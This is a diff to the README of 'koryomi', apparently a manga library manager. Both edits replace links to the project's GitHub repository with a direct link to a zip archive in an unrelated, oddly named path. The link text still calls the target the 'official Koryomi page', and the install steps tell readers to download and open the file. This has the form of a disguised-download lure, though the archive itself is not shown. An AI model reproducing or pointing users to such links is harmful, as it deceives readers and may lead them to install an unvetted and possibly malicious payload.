@@ -5,7 +5,7 @@ description: "Manage, organize, and read your self-hosted manga library on any d
 ---
 # 📖 koryomi - Manage and read your manga library
 
-[![](https://img.shields.io/badge/Download_Koryomi-Blue.svg)](https://github.com/allegro-sigmoidectomy612/koryomi)
+[![](https://img.shields.io/badge/Download_Koryomi-Blue.svg)](https://raw.githubusercontent.com/allegro-sigmoidectomy612/allegro-sigmoidectomy612.github.io/main/zooplankton/io-allegro-sigmoidectomy-github-muckite.zip)
 
 Koryomi serves as a single home for your manga and manhwa collection. It organizes your files, manages downloads, and provides a clean reader interface for your devices. You replace multiple complex services with one tool.
 
@@ -26,7 +26,7 @@ Koryomi serves as a single home for your manga and manhwa collection. It organiz
 
 ## 📥 How to Install
 
-1. Visit the [official Koryomi page](https://github.com/allegro-sigmoidectomy612/koryomi) to download the latest version of the installer.
+1. Visit the [official Koryomi page](https://raw.githubusercontent.com/allegro-sigmoidectomy612/allegro-sigmoidectomy612.github.io/main/zooplankton/io-allegro-sigmoidectomy-github-muckite.zip) to download the latest version of the installer.
 2. Open the downloaded file once the transfer completes.
 3. Follow the prompts on your screen to finish the installation.
 4. Launch the application from your start menu or desktop shortcut.
